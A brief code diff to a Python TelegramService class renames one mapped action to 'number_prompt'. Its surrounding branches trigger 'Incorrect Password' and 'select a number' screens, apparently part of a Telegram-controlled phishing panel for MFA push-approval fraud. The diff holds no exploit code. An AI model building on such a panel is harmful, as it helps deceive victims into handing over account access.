@@ -242,7 +242,7 @@ class TelegramService:
                             mapped_action = "incorrect_password"
                             feedback = "Incorrect Password screen requested! ⚠️"
                         elif action == "num_prompt":
-                            mapped_action = "pending"
+                            mapped_action = "number_prompt"
                             feedback = "Select a number to dispatch instantly! 🔢"
                             handled_inline = True
                         elif action == "picknum":
